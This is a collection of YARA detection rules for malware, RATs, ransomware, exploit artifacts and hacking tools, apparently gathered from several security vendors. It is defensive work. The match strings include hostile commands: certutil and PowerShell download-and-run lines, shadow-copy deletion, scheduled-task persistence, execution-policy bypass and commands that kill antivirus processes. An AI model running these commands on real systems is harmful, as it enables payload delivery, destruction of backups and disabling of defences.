// Warning !!
// This Rules has been Collected , Developed by SSC Search Center, use them in caution.
// All Rules here from first collection (2021) until latest .

// !! All Rules Level are `High`.
// !! All Rules Detection Level for the one rule : `5~6/10`


rule SSC_Doc_VBA_InfectedX
{
meta:
author         = "InQuest Labs"
description    = "This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent."
created_date   = "2022-03-15"
updated_date   = "2022-03-15"
blog_reference = "http://msdn.microsoft.com/en-us/library/office/aa201751%28v=office.10%29.aspx"
labs_reference = "https://labs.inquest.net/dfi/sha256/8a89a5c5dc79d4f8b8dd5007746ae36a3b005d84123b6bbc7c38637f43705023"
labs_pivot     = "N/A"
samples        = "8a89a5c5dc79d4f8b8dd5007746ae36a3b005d84123b6bbc7c38637f43705023"
strings:
$magic1 = /^\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1\x00\x00\x00/
$magic2 = /^\x50\x4B\x03\x04\x14\x00\x06\x00/
$vba_project1 = "VBA_PROJECT" wide nocase
$vba_project2 = "word/vbaProject.binPK"
condition:
(($magic1 at 0) or ($magic2 at 0)) and any of ($vba_project*)
}
rule SSC_AVS_AI_HTML_RJ
{
strings:
$s = "<iframe src=3Dcid:THE-CID height=3D0 width=3D0></iframe></body></html>" nocase
condition:
any of them
}
rule SSC_Exploit_Hacks_SOURCE
{
strings:
$s = "unknowncheats.me"
$h = { 75 6E 6B 6E 6F 77 6E 63 68 65 61 74 73 2E 6D 65 }
condition:
(any of them ) and filesize > 100KB
}
rule SSC_Extreme_Killer_X
{
meta:
source = "SSC Search Center"
author = "SSC"
description = "Custom Check for methods to stop Antimalware Services"
category = "Anti_AV"
strings:
$main1 = "taskkill" nocase
$main2 = "net stop" nocase
$av1 = "SSC_SECURITY.exe" nocase
$av2 = "TAC.exe" nocase
$av3 = "NTAC.exe" nocase
$av4 = "ADS.exe" nocase
$av5 = "SSCsrv.exe" nocase
$av6 = "FCL.exe" nocase
$av7 = "LTP.exe" nocase
$av8 = "Av*" nocase
$av9 = "MsMpEng" nocase
$av10 = "Security" nocase
$av11 = "svchost" nocase
$av12 = "as*" nocase
$av13 = "antivirus" nocase
condition:
( any of ( $main* ) ) and ( any of ( $av* ) )
}
rule SSC_Extreme_Killer_S
{
meta:
source = "SSC Search Center"
author = "SSC"
description = "Custom Check for methods to stop Antimalware Services"
category = "Anti_AV"
strings:
$main1 = "taskkill" nocase
$main2 = "net stop" nocase
$av1 = "SSC_SECURITY.exe" nocase
$av2 = "TAC.exe" nocase
$av3 = "NTAC.exe" nocase
$av4 = "ADS.exe" nocase
$av5 = "SSCsrv.exe" nocase
$av6 = "FCL.exe" nocase
$av7 = "LTP.exe" nocase
$av8 = "Av*" nocase
$av9 = "MsMpEng" nocase
$av10 = "Security" nocase
$av11 = "svchost" nocase
$av12 = "as*" nocase
$av13 = "antivirus" nocase
condition:
( any of ( $main* ) ) and ( any of ( $av* ) )
}
rule SSC_OBFUSC_BAT_DROPPER
{
meta:
author = "SSC Security Searches Center"
description = "SSC SmartView to detect OBFUSCed Scripts in Batch files to execute them later"
filetype = "bat"
strings:
$s1 = "set " nocase
$s2 = "=set" nocase
$b1 = "%"
$b2 = "="
$magic  = { 4D 5A }
condition:
not $magic and filesize > 100 and filesize < 50KB and $s1 and $s2 and (#b1 > 14 and #b2 > 3)
}
rule SSC_ForkBombWScript
{
strings:
$s1 = "do"
$s2 = "wscript.CreateObject(\"WScript.Shell\")"
$s3 = "wshshell"
$s4 = "loop"
condition:
all of them and filesize > 90 and filesize < 1KB
}
rule SSC_Double_FormBombedRecall
{
strings:
$s1 = ":"
$s2 = "start "
$s4 = "goto "
$magic  = { 4D 5A }
condition:
not $magic and filesize > 70 and filesize < 5KB and $s4 and #s2 > 3 and $s1
}
rule SSC_win_crytox_auto {
meta:
author = "SSC Searches"
date = "2023-01-25"
version = "1.1"
description = "Detects win.crytox"
info = "autogenerated rule brought to you by yara-signator"
tool = "yara-signator v0.6.0"
signator_config = "callsandjumps;datarefs;binvalue"
malpedia_reference = "https://malpedia.caad.fkie.fraunhofer.de/details/win.crytox"
malpedia_rule_date = "20230124"
malpedia_hash = "2ee0eebba83dce3d019a90519f2f972c0fcf9686"
malpedia_version = "20230125"
malpedia_license = "CC BY-SA 4.0"
malpedia_sharing = "TLP:WHITE"
strings:
$sequence_0 = { f76c2418 01c1 8b442450 11d3 f7ac24a8000000 01c1 8b442428 }
// n = 7, score = 100
//   f76c2418             | add                 esi, dword ptr [esp + 0x78]
//   01c1                 | mov                 edi, ecx
//   8b442450             | mul                 dword ptr [esp + 8]
//   11d3                 | mov                 edi, edx
//   f7ac24a8000000       | mov                 esi, eax
//   01c1                 | add                 edi, ebx
//   8b442428             | mov                 ebx, dword ptr [esp + 0xb0]
$sequence_1 = { ff15???????? 8b45dc 83ec1c 89742414 895c2410 897c2408 c744241c00000000 }
// n = 7, score = 100
//   ff15????????         |
//   8b45dc               | mov                 dword ptr [esp + 8], 1
//   83ec1c               | sub                 esp, 0x10
//   89742414             | test                eax, eax
//   895c2410             | mov                 edi, eax
//   897c2408             | mov                 edx, dword ptr [ebp - 0x4c]
//   c744241c00000000     | jle                 0xc4
$sequence_2 = { dee9 d9ac24a4000000 db9c24a0000000 d9ac24a6000000 8b8424a0000000 39d0 0f8e3a080000 }
// n = 7, score = 100
//   dee9                 | fld                 dword ptr [ebp - 4]
//   d9ac24a4000000       | fld1
//   db9c24a0000000       | fxch                st(1)
//   d9ac24a6000000       | fucomip             st(1)
//   8b8424a0000000       | fstp                st(0)
//   39d0                 | fsubp               st(1)
//   0f8e3a080000         | fstp                dword ptr [ebp - 4]
$sequence_3 = { e8???????? c9 c3 55 89e5 83ec58 8b450c }
// n = 7, score = 100
//   e8????????           |
//   c9                   | mov                 dword ptr [ebp + 0x14], 2
//   c3                   | lea                 eax, [edx + edi]
//   55                   | jmp                 0x1e
//   89e5                 | cmp                 byte ptr [ebx + 3], 0
//   83ec58               | je                  0x2a
//   8b450c               | mov                 dword ptr [ebp + 0x14], 0x18
$sequence_4 = { e9???????? 0fbf55fe 8b45f4 83c224 8b44900c 8945e0 8b45f4 }
// n = 7, score = 100
//   e9????????           |
//   0fbf55fe             | mov                 dword ptr [esp], 0xffff
//   8b45f4               | sub                 esp, 4
//   83c224               | cmp                 eax, dword ptr [esp + 0x40]
//   8b44900c             | movups              xmmword ptr [ecx + 0x10], xmm0
//   8945e0               | add                 ecx, 0x100
//   8b45f4               | movups              xmmword ptr [ecx - 0xd0], xmm5
$sequence_5 = { e8???????? e9???????? 8b4508 05c4020000 c744240806000000 c7442404b4e86a00 890424 }
// n = 7, score = 100
//   e8????????           |
//   e9????????           |
//   8b4508               | xor                 edx, edx
//   05c4020000           | mov                 word ptr [ebp - 0x1a], dx
//   c744240806000000     | movzx               eax, word ptr [ebp - 0x3c]
//   c7442404b4e86a00     | sub                 ax, word ptr [ebp - 0x1a]
//   890424               | jne                 0xc0
$sequence_6 = { e9???????? 891c24 c744240402a00000 e8???????? 895c2420 83c414 5b }
// n = 7, score = 100
//   e9????????           |
//   891c24               | sub                 eax, 1
//   c744240402a00000     | imul                eax, eax, 0x64
//   e8????????           |
//   895c2420             | add                 eax, edx
//   83c414               | mov                 eax, dword ptr [ebp + 0x2126c]
//   5b                   | mov                 edi, dword ptr [esp + 0x8c]
$sequence_7 = { e8???????? e9???????? 8b8424e0000000 8da82abc0100 8b44242c 8d500c 83c04c }
// n = 7, score = 100
//   e8????????           |
//   e9????????           |
//   8b8424e0000000       | je                  0x13c
//   8da82abc0100         | movzx               eax, byte ptr [eax + 0x80]
//   8b44242c             | mov                 dword ptr [esp], eax
//   8d500c               | cmp                 dword ptr [eax + 0x138], 0
//   83c04c               | mov                 ebx, eax
$sequence_8 = { e9???????? 890424 e8???????? 89c1 8b44246c 99 f77c247c }
// n = 7, score = 100
//   e9????????           |
//   890424               | add                 esp, 0x7c
//   e8????????           |
//   89c1                 | pop                 ebx
//   8b44246c             | pop                 esi
//   99                   | pop                 edi
//   f77c247c             | pop                 ebp
$sequence_9 = { e8???????? eb01 90 8b45f4 8b400c 890424 e8???????? }
// n = 7, score = 100
//   e8????????           |
//   eb01                 | mov                 dword ptr [esp + 0xc], eax
//   90                   | lea                 eax, [esp + 0xc8]
//   8b45f4               | mov                 dword ptr [esp + 0x68], eax
//   8b400c               | mov                 dword ptr [esp + 0x64], 0
//   890424               | xor                 edi, edi
//   e8????????           |
condition:
7 of them and filesize < 6156288
}
rule SSC_MIMZKAT_X
{
strings:
$s1 = "BCryptGetProperty"
$s2 = "BCryptOpenAlgorithmProvider"
$s3 = "BCryptCloseAlgorithmProvider"
$h1 = { 42 43 72 79 70 74 47 65 74 50 72 6F 70 65 72 74 79 }
$h2 = { 42 43 72 79 70 74 4F 70 65 6E 41 6C 67 6F 72 69 74 68 6D 50 72 6F 76 69 64 65 72 }
condition:
any of them and filesize > 10KB and filesize < 2222KB
}
rule SSC_KEYLOG_STRINGS_X
{
strings:
$s1 = "keylogger"
$h1 = { 6B 65 79 6C 6F 67 67 65 72 }
condition:
any of them and filesize > 1KB and filesize < 9000KB
}
rule SSC_TROJAN_STRINGS_X
{
strings:
$s1 = "trojan" nocase
$h1 = { 74 72 6F 6A 61 6E }
condition:
any of them and filesize > 1KB
}
rule SSC_RAT_NET_UPD_X {
meta:
author      = "SSC Searches"
date        = "26-05-2022"
description = "DcRat by qwqdanchun"
hash0       = "4530c2681887c0748cc2ecddb1976d15ad813a4a01e5810fd8b843adcd2fd3d0"
ref0        = "https://github.com/qwqdanchun/DcRat"
strings:
$magic  = { 4D 5A }
$s01    = "/c schtasks /create /f /sc onlogon /rl highest /tn " base64wide
$s02    = "Select * from Win32_CacheMemory" wide fullword
$s03    = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" base64wide
$s04    = "timeout 3 > NUL" wide fullword
$s05    = "Pac_ket" wide fullword
$s06    = "Po_ng" wide fullword
$s07    = "plu_gin" wide fullword
$s08    = "AmsiScanBuffer" base64wide
$s09    = "MsMpEng.exe" wide fullword
condition:
filesize < 1MB and $magic and all of ($s*)
}
rule SSC_SND_Searches1245
{
meta:
author = "AlienVault Labs + SSC Updates"
type = "info"
severity = 1
description = "Sandbox detection tricks"
strings:
$sbxie1 = "sbiedll" nocase ascii wide
$prodid1 = "55274-640-2673064-23950" ascii wide
$prodid2 = "76487-644-3177037-23510" ascii wide
$prodid3 = "76487-337-8429955-22614" ascii wide
condition:
any of them
}
rule SSC_NET_INFO_WORM {
meta:
description = "Smart Detection for netinfo.exe worm"
strings:
$s1 = "netinfo.exe"
$h1 = { 6E 65 74 69 6E 66 6F 2E 65 78 65 }
condition:
any of them and filesize > 199KB
}
rule SSC_SUSP_NET_NAME_ConfuserEx {
meta:
description = "Detects ConfuserEx packed file"
reference = "https://github.com/yck1509/ConfuserEx"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "SSC Searches"
score = 40
date = "2021-01-22"
modified = "2021-01-25"
strings:
$name = "ConfuserEx" ascii wide
$compile = "AssemblyTitle" ascii wide
condition:
(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}
rule SSC_Multifamily_RAT_Detection
{
meta:
author = "SSC Searches"
description = "Generic Detection for multiple RAT families, PUPs, Packers and suspicious executables"
strings:
$htt1 = "WScript.Shell" wide
$htt2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" wide
$htt3 = "\\nuR\\noisreVtnerruC\\swodniW" wide
$htt4 = "SecurityCenter2" wide
$htt5 = ":ptth" wide
$htt6 = ":sptth" wide
$htt7 = "System.Reflection" ascii
$htt8 = "ConfuserEx" ascii
$htt9 = ".NET Framework 4 Client Profile" ascii
$htt10 = "CreateEncryptor" ascii
$mzh = "This program cannot be run in DOS mode"
condition:
(pe.imphash() == "b8bb385806b89680e13fc0cf24f4431e" or pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744") and 3 of ($htt*) and $mzh
}
rule SSC_SUS_NREDLINE_UPD
{
strings:
$p1 = "$8f9b0de4-2865-45be-86dd-191e70b2263c"
$p2 = "$F935DC23-1CF0-11D0-ADB9-00C04FD58A0B"
$p3 = "onLevel level=\"requireAdministrator\" uiAccess=\"false\" />\r\n      </requestedPrivileges>\r\n      <applicationRequestMinimum>\r\n"
$h1 = { 24 38 66 39 62 30 64 65 34 2D 32 38 36 35 2D 34 35 62 65 2D 38 36 64 64 2D 31 39 31 65 37 30 62 32 32 36 33 63 }
$h2 = { 24 46 39 33 35 44 43 32 33 2D 31 43 46 30 2D 31 31 44 30 2D 41 44 42 39 2D 30 30 43 30 34 46 44 35 38 41 30 42 }
$h3 = { 6F 6E 4C 65 76 65 6C 20 6C 65 76 65 6C 3D 5C 22 72 65 71 75 69 72 65 41 64 6D 69 6E 69 73 74 72 61 74 6F 72 5C 22 20 75 69 41 63 63 65 73 73 3D 5C 22 66 61 6C 73 65 5C 22 20 2F 3E 5C 72 5C 6E 20 20 20 20 20 20 3C 2F 72 65 71 75 65 73 74 65 64 50 72 69 76 69 6C 65 67 65 73 3E 5C 72 5C 6E 20 20 20 20 20 20 3C 61 70 70 6C 69 63 61 74 69 6F 6E 52 65 71 75 65 73 74 4D 69 6E 69 6D 75 6D 3E 5C 72 5C 6E }
condition:
any of them
}
rule SSC_TOOL_SCN_PortScan {
meta:
author = "ditekSHen"
description = "Detects a port scanner tool observed as second or third stage post-compromise or dropped by malware."
strings:
$s1 = "HEAD / HTTP/1.0" fullword ascii
$s2 = "Result.txt" fullword ascii
$s3 = "Example: %s SYN " ascii
$s4 = "Performing Time: %d/%d/%d %d:%d:%d -->" fullword ascii
$s5 = "Bind On IP: %d.%d.%d.%d" fullword ascii
$s6 = "SYN Scan: About To Scan %" ascii
$s7 = "Normal Scan: About To Scan %" ascii
condition:
uint16(0) == 0x5a4d and 5 of them
}
rule SSC_TOOL_SCR_Amady {
meta:
author = "ditekSHen"
description = "Detects screenshot stealer DLL. Dropped by Amadey"
strings:
$s1 = "User-Agent: Uploador" fullword ascii
$s2 = "Content-Disposition: form-data; name=\"data\"; filename=\"" fullword ascii
$s3 = "WebUpload" fullword ascii
$s4 = "Cannot assign a %s to a %s%List does not allow duplicates ($0%x)%String" wide
$s5 = "scr.dll" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 700KB and 4 of them
}
rule SSC_TOOL_EXP_EternalBlue {
meta:
author = "ditekSHen"
description = "Detects Windows executables containing EternalBlue explitation artifacts"
strings:
$ci1 = "CNEFileIO_" ascii wide
$ci2 = "coli_" ascii wide
$ci3 = "mainWrapper" ascii wide
$dp1 = "EXPLOIT_SHELLCODE" ascii wide
$dp2 = "ETERNALBLUE_VALIDATE_BACKDOOR" ascii wide
$dp3 = "ETERNALBLUE_DOUBLEPULSAR_PRESENT" ascii wide
$dp4 = "//service[name='smb']/port" ascii wide
$dp5 = /DOUBLEPULSAR_(PROTOCOL_|ARCHITECTURE_|FUNCTION_|DLL_|PROCESS_|COMMAND_|IS_64_BIT)/
$cm1 = "--DllOrdinal 1 ProcessName lsass.exe --ProcessCommandLine --Protocol SMB --Architecture x64 --Function Rundll" ascii wide
$cm2 = "--DllOrdinal 1 ProcessName lsass.exe --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll" ascii wide
$cm3 = "--DaveProxyPort=0 --NetworkTimeout 30 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig" ascii wide
condition:
uint16(0) == 0x5a4d and (2 of ($ci*)) or (2 of ($dp*)) or (1 of ($dp*) and 1 of ($ci*)) or (1 of ($cm*))
}
rule SSC_TOOL_EXP_WebLogic {
meta:
author = "ditekSHen"
description = "Detects Windows executables containing Weblogic exploits commands"
strings:
$s1 = "certutil.exe -urlcache -split -f AAAAA BBBBB & cmd.exe /c BBBBB" ascii
$s2 = "powershell (new-object System.Net.WebClient).DownloadFile('AAAAA','BBBBB')" ascii
condition:
uint16(0) == 0x5a4d and 1 of them
}
rule SSC_TOOL_EXP_ApacheStrusts {
meta:
author = "ditekSHen"
description = "Detects Windows executables containing ApacheStruts exploit artifatcs"
strings:
// CVE-2017-5638
$x1 = "apache.struts2.ServletActionContext@getResponse" ascii
$e1 = ".getWriter()" ascii
$e2 = ".getOutputStream()" ascii
$e3 = ".getInputStream()" ascii
// CVE-2018-11776
$x2 = "#_memberAccess" ascii
$s1 = "ognl.OgnlContext" ascii
$s2 = "ognl.ClassResolver" ascii
$s3 = "ognl.TypeConverter" ascii
$s4 = "ognl.MemberAccess" ascii
condition:
(uint16(0) == 0x5a4d or uint16(0) == 0x457f) and ($x1 and 2 of ($e*)) or ($x2 and 1 of ($s*))
}
rule SSC_Exploits_Updated_A
{
strings:
$s1 = "MeteTool" nocase
$s2 = "MPreter" nocase
$s3 = "Meterpreter" nocase
$s4 = "Metasploit" nocase
$s5 = "PowerSploit" nocase
$s6 = "CobaltStrike" nocase
$s7 = "Brutel" nocase
$s8 = "Backdoor.Cobalt" nocase
$s9 = "Exploit.Script.CVE" nocase
$s10 = "exploit" nocase
condition:
any of them and filesize > 1KB and filesize < 50000KB
}
rule SSC_Ransomware_Conti_89f3f6fa {
meta:
author = "SSC Security"
id = "89f3f6fa-492c-40e3-a4aa-a526004197b2"
fingerprint = "a82331eba3cbd52deb4bed5e11035ac1e519ec27931507f582f2985865c0fb1a"
creation_date = "2021-08-05"
last_modified = "2021-10-04"
threat_name = "Windows.Ransomware.Conti"
reference_sample = "eae876886f19ba384f55778634a35a1d975414e83f22f6111e3e792f706301fe"
severity = 100
arch_context = "x86"
scan_context = "file, memory"
license = "Elastic License v2"
os = "windows"
strings:
$a = { F7 FE 88 57 FF 83 EB 01 75 DA 8B 45 FC 5F 5B 40 5E 8B E5 5D C3 8D }
condition:
all of them
}
rule SSC_AV_DISABLE_C
{
strings:
$s1 = "AntivirusDisableNotify"
$h1 = { 61 6E 74 69 76 69 72 75 73 64 69 73 61 62 6C 65 6E 6F 74 69 66 79 }
condition:
any of them
}
rule SSC_FireWall_Disable_A
{
strings:
$s1 = "FirewallDisableNotify"
$h1 = { 66 69 72 65 77 61 6C 6C 64 69 73 61 62 6C 65 6E 6F 74 69 66 79 }
condition:
any of them
}
rule SSC_MEMZ_UPDT
{
strings:
$s1 = "BCryptCloseAlgorithmProvider"
$s2 = "BCryptDestroyKey"
$h1 = { 42 43 72 79 70 74 44 65 73 74 72 6F 79 4B 65 79 }
$h2 = { 42 43 72 79 70 74 43 6C 6F 73 65 41 6C 67 6F 72 69 74 68 6D 50 72 6F 76 69 64 65 72 }
condition:
any of them and filesize > 10KB and filesize < 2222KB
}
rule SSC_RAT_Remove_Func_N
{
meta:
description = "SSC Danger Zone for Rat Controller over Files"
version = "1.0"
creation_date = "2023-02-01"
strings:
$s1 = "EtwpNotificationThread"
$h1 = { 45 74 77 70 4E 6F 74 69 66 69 63 61 74 69 6F 6E 54 68 72 65 61 64 }
condition:
any of them
}
rule SSC_RAT_Remove_Func_2_1_23
{
meta:
description = "SSC Danger Zone for Rat Controller over Files"
version = "1.0"
creation_date = "2023-02-01"
strings:
$s1 = "EtwpNotificationThread"
$h1 = { 45 74 77 70 4E 6F 74 69 66 69 63 61 74 69 6F 6E 54 68 72 65 61 64 }
condition:
any of them
}
rule SSC_Sus_EXE_Create_Hex
{
meta:
description = " SSC Smart View for Unsafe Creation of Unverified Files In Hex Form"
version = "1.0"
creation_date = "2023-02-01"
strings:
$cmd1 = { 2E 62 61 74 2E 65 78 65 }
$cmd2 = { 2E 73 79 73 2E 65 78 65 }
$arg1 = { 43 3A 5C 44 6F 63 75 6D 65 6E 74 73 20 61 6E 64 20 53 65 74 74 69 6E 67 73 2E 65 78 65 }
$arg2 = { 43 3A 5C 50 65 72 66 4C 6F 67 73 2E 65 78 65 }
$arg3 = { 43 3A 5C 52 65 63 6F 76 65 72 79 2E 65 78 65 }
condition:
2 of them
}
rule SSC_Sus_EXE_Create
{
meta:
description = " SSC Smart View for Unsafe Creation of Unverified Files"
version = "1.0"
creation_date = "2023-02-01"
strings:
$cmd1 = ".bat.exe"
$cmd2 = ".sys.exe"
$srg1 = "C:\\Documents and Settings.exe"
$srg2 = "C:\\PerfLogs.exe"
$srg3 = "C:\\Recovery.exe"
condition:
2 of them
}
rule SSC_ByPass_Sec_2_1_23
{
meta:
description = " Unsafe Methods for Bypassing Security and Running High_Level Exe "
version = "1.0"
creation_date = "2023-02-01"
strings:
$c1 = "exec "
$c2 = "executionpolicy"
$c3 = "Unrestricted"
$c4 = "bypass "
$c5 = "RemoteSigned"
$par1 = "ProgramData"
$par2 = "AppData"
condition:
3 of them
}
rule SSC_trochilus_softcell {
meta:
description = "Rule to detect Trochilus malware used in the SoftCell operation"
date = "2019-06-25"
rule_version = "v1"
malware_type = "trojan"
malware_family = "Trojan:W32/Trochilus"
actor_type = "Apt"
actor_group = "Unknown"
reference = "https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers"
strings:
$s1 = "Shell.dll" fullword ascii
$s2 = "photo.dat" fullword wide
$s3 = "VW9HxtV9H|tQ9" fullword ascii
$s4 = "G6uEGRich7uEG" fullword ascii
$op0 = { e8 9d ad ff ff ff b6 a8 }
$op1 = { e8 d4 ad ff ff ff b6 94 }
$op2 = { e8 ea ad ff ff ff b6 8c }
condition:
uint16(0) == 0x5a4d and
filesize < 200KB and
( pe.imphash() == "8e13ebc144667958722686cb04ee16f8" and
( pe.exports("Entry") and
pe.exports("Main") ) and
all of them )
}
rule SSC_mangzamel_softcell {
meta:
description = "Rule to detect Mangzamel used in the SoftCell operation"
author = "Marc Rivero | McAfee ATR Team"
date = "2019-06-25"
rule_version = "v1"
malware_type = "trojan"
malware_family = "Trojan:W32/Mangzamel"
actor_type = "Apt"
actor_group = "Unknown"
reference = "https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers"
strings:
$s1 = "Change Service Mode to user logon failure.code:%d" fullword ascii
$s2 = "spoolsvs.exe" fullword wide
$s3 = "System\\CurrentControlSet\\Services\\%s\\parameters\\%s" fullword ascii
$s4 = "Please Correct [-s %s]" fullword ascii
$s5 = "Please Correct [-m %s]" fullword ascii
$op0 = { 59 8d 85 64 ff ff ff 50 c7 85 64 ff ff ff 94 }
$op1 = { c9 c2 08 00 81 c1 30 34 00 00 e9 cf 9b ff ff 55 }
$op2 = { 80 0f b6 b5 68 ff ff ff c1 e2 04 0b d6 0f b6 b5 }
condition:
uint16(0) == 0x5a4d and
filesize < 300KB and
( pe.imphash() == "ef64bb4aa42ef5a8a2e3858a636bce40" and
all of them )
}
rule SSC_CobaltStrike2 {
meta:
description = "detect CobaltStrike Beacon in memory"
author = "JPCERT/CC Incident Response Group"
rule_usage = "memory scan"
reference = "https://blogs.jpcert.or.jp/en/2018/08/volatility-plugin-for-detecting-cobalt-strike-beacon.html"
hash1 = "154db8746a9d0244146648006cc94f120390587e02677b97f044c25870d512c3"
hash2 = "f9b93c92ed50743cd004532ab379e3135197b6fb5341322975f4d7a98a0fcde7"
strings:
$v1 = { 73 70 72 6E 67 00 }
$v2 = { 69 69 69 69 69 69 69 69 }
condition: all of them
}
rule SSC_Formbook2 {
meta:
description = "detect Formbook in memory"
author = "JPCERT/CC Incident Response Group"
rule_usage = "memory scan"
reference = "internal research"
strings:
$sqlite3step = { 68 34 1c 7b e1 }
$sqlite3text = { 68 38 2a 90 c5 }
$sqlite3blob = { 68 53 d8 7f 8c }
condition: all of them
}
rule SSC_WMIC_SHAD_MAL
{
strings:
$TXT = "wmic shadowcopy delete"
$TXT2 = "wmic shadowstorage"
$HEX = { 73 68 61 64 6F 77 63 6F 70 79 20 64 65 6C 65 74 65 }
condition:
any of them
}
rule SSC_HKTL_NATBypass_Dec22_1_RID2E57 : DEMO G0096 HKTL T1090 {
meta:
description = "Detects NatBypass tool (also used by APT41)"
author = "Florian Roth"
reference = "https://github.com/cw1997/NATBypass"
date = "2022-12-27 11:10:21"
score = 80
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "4550635143c9997d5499d1d4a4c860126ee9299311fed0f85df9bb304dca81ff"
tags = "DEMO, G0096, HKTL, T1090"
minimum_yara = "1.7"
strings:
$x1 = "nb -slave 127.0.0.1:3389 8.8.8.8:1997" ascii
$x2 = "| Welcome to use NATBypass Ver" ascii
$s1 = "main.port2host.func1" ascii fullword
$s2 = "start to transmit address:" ascii
$s3 = "^(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])\\.(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])\\.(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])\\.(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])"
condition:
filesize < 8000KB and ( 1 of ( $x* ) or 2 of them ) or 3 of them
}
rule SSC_HKTL_Venom_LIB_Dec22_RID2DAD : DEMO EXE FILE HKTL {
meta:
description = "Detects Venom - a library that meant to perform evasive communication using stolen browser socket"
author = "Florian Roth"
reference = "https://github.com/Idov31/Venom"
date = "2022-12-17 10:42:01"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, EXE, FILE, HKTL"
minimum_yara = "1.7"
strings:
$x1 = "[ + ] Created detached hidden msedge process: " fullword ascii
$ss1 = "WS2_32.dll" fullword ascii
$ss2 = "WSASocketW" fullword ascii
$ss3 = "WSADuplicateSocketW" fullword ascii
$ss5 = "\\Device\\Afd" wide fullword
$sx1 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe --no-startup-window" fullword wide
$sx2 = "[ + ] Data sent!" fullword ascii
$sx3 = "[ + ] Socket obtained!" fullword ascii
$op1 = { 4c 8b f0 48 3b c1 48 b8 ff ff ff ff ff ff ff 7f }
$op2 = { 48 8b cf e8 1c 34 00 00 48 8b 5c 24 30 48 8b c7 }
$op3 = { 48 8b da 48 8b f9 45 33 f6 48 85 c9 0f 84 34 01 }
condition:
uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( ( 3 of ( $ss* ) and all of ( $op* ) ) or 2 of ( $sx* ) ) or $x1 or all of ( $sx* )
}
rule SSC_HKTL_BruteRatel_Badger_Indicators_Oct22_4_RID362C : DEMO FILE HKTL {
meta:
description = "Detects Brute Ratel C4 badger indicators"
author = "Florian Roth"
reference = "https://twitter.com/embee_research/status/1580030310778953728"
date = "2022-10-12 16:44:31"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, FILE, HKTL"
minimum_yara = "1.7"
strings:
$s1 = { b? 89 4d 39 8c }
$s2 = { b? bd ca 3b d3 }
$s3 = { b? b2 c1 06 ae }
$s4 = { b? 74 eb 1d 4d }
condition:
filesize < 8000KB and all of ( $s* ) and not uint8 ( 0 ) == 0x02
}
rule SSC_HKTL_PUA_NET_AdCollector_Sep22_1_RID31F5 : DEMO EXE FILE HKTL {
meta:
description = "Detects ADCollector Tool - a lightweight tool to quickly extract valuable information from the Active Directory environment for both attacking and defending"
author = "Florian Roth"
reference = "https://github.com/dev-2null/ADCollector"
date = "2022-09-15 13:44:41"
score = 70
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "241390219a0a773463601ca68b77af97453c20af00a66492a7a78c04d481d338"
hash2 = "cc086eb7316e68661e3d547b414890d5029c5cc460134d8b628f4b0be7f27fb3"
tags = "DEMO, EXE, FILE, HKTL"
minimum_yara = "1.7"
strings:
$x1 = "ADCollector.exe --SPNs --Term key --Acls 'CN=Domain Admins,CN=Users,DC=lab,DC=local'" wide fullword
$s1 = "ADCollector.exe" wide fullword
$s2 = "ENCRYPTED_TEXT_PASSWORD_ALLOWED" ascii fullword
$s3 = "\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf" wide
$s4 = "[-] Password Does Not Expire Accounts:" wide
$s5 = "  * runAs:       {0}" wide fullword
condition:
uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( 1 of ( $x* ) or 3 of them )
}
rule SSC_HKTL_Khepri_Beacon_Sep21_1_RID3027 : COBALTSTRIKE DEMO EXE HKTL T1105 {
meta:
description = "Detects Khepri C2 framework beacons"
author = "Florian Roth"
reference = "https://github.com/geemion/Khepri/"
date = "2021-09-08 12:27:41"
score = 90
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
hash1 = "86c48679db5f4c085fd741ebec5235bc6cf0cdf8ef2d98fd8a689ceb5088f431"
tags = "COBALTSTRIKE, DEMO, EXE, HKTL, T1105"
minimum_yara = "3.2.0"
strings:
$x1 = "NT %d.%d Build %d  ProductType:%s" ascii fullword
$xe1 = "YzIuQ01EUEFSQU0uY21k" ascii
$xe2 = "MyLkNNRFBBUkFNLmNtZ" ascii
$xe3 = "jMi5DTURQQVJBTS5jbW" ascii
$sx1 = "c2.ProcessItem.user" ascii fullword
$sx2 = "c2.CMDPARAM.cmd" ascii fullword
$sx3 = "c2.DownLoadFile.file_path" ascii fullword
$sa1 = "file size zero"
$sa2 = "cmd.exe /c "
$sa3 = "error parse param"
$sa4 = "innet_ip"
$op1 = { c3 b9 b4 98 49 00 87 01 5d c3 b8 b8 98 49 00 c3 8b ff }
$op2 = { 8b f1 80 3d 58 97 49 00 00 0f 85 96 00 00 00 33 c0 40 b9 50 97 49 00 87 01 33 db }
